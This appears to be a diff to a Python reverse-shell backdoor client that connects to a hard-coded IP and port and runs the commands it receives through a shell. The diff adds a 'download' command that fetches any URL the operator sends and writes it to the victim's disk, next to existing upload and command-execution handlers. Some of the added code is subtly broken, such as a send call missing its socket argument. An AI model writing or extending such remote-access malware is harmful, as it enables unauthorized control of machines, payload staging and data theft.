@@ -8,6 +8,7 @@ import os
 import base64
 import shutil
 import time
+import requests
 
 HOST = '192.168.0.94'
 PORT = 54321
@@ -27,6 +28,13 @@ def reliable_recv(_s):
             return json.loads(data)
         except ValueError:
             continue
+
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split('/')[-1]
+    with open(file_name, 'wb') as f:
+        f.write(get_response.content)
 
 
 def connection(_s):
@@ -66,6 +74,12 @@ def shell(_s):
             except:
                 failed = 'Failed to Upload'
                 reliable_send(_s, base64.b64encode(failed))
+        elif cmd[:8] == 'download' and len(cmd[9:]) > 1:
+            try:
+                download(cmd[9:])
+                reliable_send('[+] Downloaded File from the specified URL!')
+            except:
+                reliable_send('[!] Failed to Download the File from the specified URL!')
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
